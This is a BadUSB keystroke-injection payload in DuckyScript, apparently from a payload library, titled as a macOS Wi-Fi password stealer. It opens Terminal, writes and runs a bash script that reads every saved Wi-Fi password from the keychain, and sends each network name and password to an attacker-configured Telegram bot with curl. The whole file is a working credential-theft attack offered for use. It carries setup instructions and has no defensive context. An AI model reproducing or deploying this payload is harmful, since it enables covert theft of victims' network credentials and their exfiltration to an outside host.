REM Title: macOS WiFi Password Stealer to Telegram
REM Author: BadUSB Library
REM Description: Extracts WiFi passwords and sends to Telegram
REM Target: macOS 10.15+
REM Category: Authentication
REM Type: Configuration Needed

REM *SETUP*
REM Replace TELEGRAM_BOT_TOKEN with your Telegram Bot Token
REM Replace TELEGRAM_CHAT_ID with your Telegram Chat ID

REM Open Terminal
DELAY 2000
GUI SPACE
DELAY 1000
STRING Terminal
ENTER
DELAY 3000

REM Create WiFi password stealer
STRING cat > /tmp/wifi_stealer.sh << 'EOF'
#!/bin/bash
BOT_TOKEN="TELEGRAM_BOT_TOKEN"
CHAT_ID="TELEGRAM_CHAT_ID"

# Get WiFi passwords
for network in $(networksetup -listallhardwareports | grep -A 1 "Wi-Fi" | grep "Device:" | awk '{print $2}'); do
    networksetup -listpreferredwirelessnetworks $network | while read line; do
        if [[ $line == *"("*")"* ]]; then
            ssid=$(echo $line | sed 's/.*(\(.*\)).*/\1/')
            password=$(security find-generic-password -D "AirPort network password" -a "$ssid" -w 2>/dev/null)
            if [ ! -z "$password" ]; then
                curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" -d chat_id="${CHAT_ID}" -d text="WiFi: $ssid - Password: $password"
            fi
        fi
    done
done
EOF
ENTER
DELAY 2000

STRING chmod +x /tmp/wifi_stealer.sh
ENTER
DELAY 1000

STRING /tmp/wifi_stealer.sh
ENTER
DELAY 2000
